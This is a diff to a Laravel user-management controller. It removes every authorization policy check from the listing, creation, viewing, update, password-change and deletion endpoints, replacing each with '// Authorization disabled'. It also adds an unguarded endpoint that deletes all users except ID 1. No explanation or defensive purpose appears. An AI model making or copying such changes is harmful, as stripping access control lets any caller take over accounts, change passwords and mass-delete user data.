@@ -20,7 +20,7 @@ class UserController extends Controller
      */
     public function index()
     {
-        $this->authorize('viewAny', User::class); // Policy check
+        // Authorization disabled
         $users = User::latest()->paginate(20); // Paginate users
         return UserResource::collection($users);
     }
@@ -32,9 +32,7 @@ class UserController extends Controller
     public function store(Request $request)
     {
         // Allow admins to create any user, public registration might have different validation/defaults
-        if (auth()->check()) { // If called by an authenticated user (admin)
-            $this->authorize('create', User::class);
-        }
+        // Authorization disabled
 
         $validator = Validator::make($request->all(), [
             'name' => 'required|string|max:255',
@@ -78,7 +76,7 @@ class UserController extends Controller
      */
     public function show(User $user) // Route model binding
     {
-        $this->authorize('view', $user);
+        // Authorization disabled
         return new UserResource($user);
     }
 
@@ -88,7 +86,7 @@ class UserController extends Controller
      */
     public function update(Request $request, User $user)
     {
-        $this->authorize('update', $user);
+        // Authorization disabled
 
         $validator = Validator::make($request->all(), [
             'name' => 'sometimes|required|string|max:255',
@@ -121,7 +119,7 @@ class UserController extends Controller
     public function updatePassword(Request $request, User $user)
     {
         // Use the same 'update' permission or a specific 'updatePassword' permission
-        $this->authorize('update', $user); // Or $this->authorize('updatePassword', $user);
+        // Authorization disabled
 
         $validator = Validator::make($request->all(), [
             'password' => ['required', 'confirmed', Password::defaults()], // Requires password_confirmation
@@ -145,7 +143,7 @@ class UserController extends Controller
      */
     public function destroy(User $user)
     {
-        $this->authorize('delete', $user);
+        // Authorization disabled
 
         // Prevent deleting the last admin? Or oneself? Add checks if needed.
         // Example with Spatie roles (disabled for now):
@@ -159,6 +157,17 @@ class UserController extends Controller
         $user->delete(); // Soft delete
 
         return response()->json(['message' => 'تم حذف المستخدم بنجاح.'], 200);
+    }
+
+    /**
+     * Purge all users except the user with ID = 1.
+     */
+    public function purgeNonAdminUsers()
+    {
+        // Consider guarding this with authorization in production
+        User::where('id', '!=', 1)->delete();
+
+        return response()->json(['message' => 'تم حذف جميع المستخدمين ما عدا المستخدم ذو المعرّف 1.']);
     }
 
     // You might already have a register method for public registration?
